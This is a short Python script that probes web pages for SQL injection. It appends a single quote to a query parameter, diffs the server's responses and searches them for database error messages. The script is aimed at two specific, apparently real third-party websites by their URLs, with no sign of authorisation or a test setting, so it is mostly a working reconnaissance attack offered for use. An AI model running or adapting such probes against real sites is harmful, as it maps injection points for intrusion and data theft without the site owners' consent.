#!/usr/bin/env python3
"""analyze SQLi response diff - find injectable field position"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def analyze(url_base, tag):
    code0, b0 = fetch(url_base)
    code1, b1 = fetch(url_base + "'")
    print("=== %s ===" % tag)
    print("  base: %d bytes, quote: %d bytes, diff: %+d" % (len(b0), len(b1), len(b1) - len(b0)))
    # find common prefix/suffix
    i = 0
    while i < min(len(b0), len(b1)) and b0[i] == b1[i]:
        i += 1
    j = 0
    while j < min(len(b0), len(b1)) - i and b0[len(b0)-1-j] == b1[len(b1)-1-j]:
        j += 1
    print("  common prefix: %d chars" % i)
    # show the diff region from quote response
    if len(b1) > i + j:
        diff_region = b1[i:len(b1)-j] if j else b1[i:i+2000]
        print("  quote diff region (%d chars):" % len(diff_region))
        print("   ", diff_region[:800].replace("\n", " ")[:800])
    # error message?
    for sig in ["SQL", "mysql", "syntax", "Warning", "Fatal", "error", "query", "SQLSTATE"]:
        for label, b in [("base", b0), ("quote", b1)]:
            m = re.search(sig + r'[^<]{0,120}', b, re.I)
            if m:
                print("  [%s] %s: %s" % (tag, label, m.group(0)[:120]))

analyze("http://yijingweb.com/webmall/detail.php?id=686", "yijingweb")
analyze("http://zagroup.net/news.php?c=259", "zagroup")
